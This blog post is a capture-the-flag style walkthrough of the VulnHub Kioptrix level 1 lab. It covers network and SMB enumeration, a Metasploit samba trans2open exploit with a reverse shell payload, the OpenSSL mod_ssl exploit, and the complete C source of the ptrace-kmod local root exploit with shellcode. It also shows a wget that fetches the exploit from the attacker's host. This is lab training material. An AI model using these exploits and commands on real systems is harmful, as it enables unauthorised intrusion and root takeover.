---
layout: post
title: "Vulhub-Kioptrix level 1"
date: 2016-06-06 09:21:18 -0500
comments: true
categories: [vulhub, smb, openssl]
---

From [Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

###Tools:

* netdiscover
* Nmap
* nbtscab
* enum4linux
* Metasploit
* Nikto


<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/kioptrix1/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.182 is the target.


Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.182 -p-`

Opening ports: 22, 111, 139, 80, 443, 1024.

{% img  /images/blog/vulhub/kioptrix1/Selection_002.png   [title manually exploit [alt text]] %}


SMB Attack:

Looks like SMB service is on. Lets start nbtscan to exam SMB.

`nbtscan 192.168.79.182`

{% img  /images/blog/vulhub/kioptrix1/Selection_003.png   [title manually exploit [alt text]] %}

use enum4linux to enumerate smb:

`enum4linux  -a 192.168.79.182`


{% img  /images/blog/vulhub/kioptrix1/Selection_004.png   [title manually exploit [alt text]] %}

get the samba version

Now start Metasploit:

```
msfconsole
search samba
use exploit/linux/samba/trans2open
set rhost 192.168.79.182
set payload generic/shell_reverse_tcp
exploit

```

{% img  /images/blog/vulhub/kioptrix1/Selection_005.png   [title manually exploit [alt text]] %}


DONE SMB


mod_ssl exploit:


use nikto to scan:

`nikto -h 192.168.79.182`


{% img  /images/blog/vulhub/kioptrix1/Selection_006.png   [title manually exploit [alt text]] %}

Looks like mod_ssl is vulnerable


search exploits:


`searchexploit openssl`

{% img  /images/blog/vulhub/kioptrix1/Selection_007.png   [title manually exploit [alt text]] %}

now try to compile the c code. Get error. Find a [blog](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) to fix it.

now recompile:

`
gcc 764.c -o 764 -lcrypto
`

run the 764 and it requires to input id for the target's supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)

so I can just:

`./764 -h |grep 1.3.20`

{% img  /images/blog/vulhub/kioptrix1/Selection_008.png   [title manually exploit [alt text]] %}

so we can just 0x6a and 0x0b. Finially got 0x0b works


{% img  /images/blog/vulhub/kioptrix1/Selection_009.png   [title manually exploit [alt text]] %}



I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn't connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c

```c ptrace-kmod.c
/*
 * Linux kernel ptrace/kmod local root exploit
 *
 * This code exploits a race condition in kernel/kmod.c, which creates
 * kernel thread in insecure manner. This bug allows to ptrace cloned
 * process, allowing to take control over privileged modprobe binary.
 *
 * Should work under all current 2.2.x and 2.4.x kernels.
 * 
 * I discovered this stupid bug independently on January 25, 2003, that
 * is (almost) two month before it was fixed and published by Red Hat
 * and others.
 * 
 * Wojciech Purczynski <cliph@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 * 
 * (c) 2003 Copyright by iSEC Security Research
 */

#include <grp.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <paths.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <linux/user.h>

char cliphcode[] =
	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
	"\x00\x5b\x31\xc9\x89\xca\xcd\x80"
	"\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
	"\x00\x00\xcd\x80\x89\xd0\x89\xd3"
	"\x40\xcd\x80\xe8\xdc\xff\xff\xff";

#define CODE_SIZE (sizeof(cliphcode) - 1)

pid_t parent = 1;
pid_t child = 1;
pid_t victim = 1;
volatile int gotchild = 0;

void fatal(char * msg)
{
	perror(msg);
	kill(parent, SIGKILL);
	kill(child, SIGKILL);
	kill(victim, SIGKILL);
}

void putcode(unsigned long * dst)
{
	char buf[MAXPATHLEN + CODE_SIZE];
	unsigned long * src;
	int i, len;

	memcpy(buf, cliphcode, CODE_SIZE);
	len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
	if (len == -1)
		fatal("[-] Unable to read /proc/self/exe");

	len += CODE_SIZE + 1;
	buf[len] = '\0';
	
	src = (unsigned long*) buf;
	for (i = 0; i < len; i += 4)
		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
			fatal("[-] Unable to write shellcode");
}

void sigchld(int signo)
{
	struct user_regs_struct regs;

	if (gotchild++ == 0)
		return;
	
	fprintf(stderr, "[+] Signal caught\n");

	if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)
		fatal("[-] Unable to read registers");
	
	fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
	
	putcode((unsigned long *)regs.eip);

	fprintf(stderr, "[+] Now wait for suid shell...\n");

	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
		fatal("[-] Unable to detach from victim");

	exit(0);
}

void sigalrm(int signo)
{
	errno = ECANCELED;
	fatal("[-] Fatal error");
}

void do_child(void)
{
	int err;

	child = getpid();
	victim = child + 1;

	signal(SIGCHLD, sigchld);

	do
		err = ptrace(PTRACE_ATTACH, victim, 0, 0);
	while (err == -1 && errno == ESRCH);

	if (err == -1)
		fatal("[-] Unable to attach");

	fprintf(stderr, "[+] Attached to %d\n", victim);
	while (!gotchild) ;
	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
		fatal("[-] Unable to setup syscall trace");
	fprintf(stderr, "[+] Waiting for signal\n");

	for(;;);
}

void do_parent(char * progname)
{
	struct stat st;
	int err;
	errno = 0;
	socket(AF_SECURITY, SOCK_STREAM, 1);
	do {
		err = stat(progname, &st);
	} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);
	
	if (err == -1)
		fatal("[-] Unable to stat myself");

	alarm(0);
	system(progname);
}

void prepare(void)
{
	if (geteuid() == 0) {
		initgroups("root", 0);
		setgid(0);
		setuid(0);
		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
		fatal("[-] Unable to spawn shell");
	}
}

int main(int argc, char ** argv)
{
	prepare();
	signal(SIGALRM, sigalrm);
	alarm(10);
	
	parent = getpid();
	child = fork();
	victim = child + 1;
	
	if (child == -1)
		fatal("[-] Unable to fork");

	if (child == 0)
		do_child();
	else
		do_parent(argv[0]);

	return 0;
}


```

in target vm /tmp:

`wget http://192.168.79.173/ptrace-kmod.c`

'gcc ptrace-kmod.c -o attack'

run attack:

{% img  /images/blog/vulhub/kioptrix1/Selection_010.png   [title manually exploit [alt text]] %}

DONE



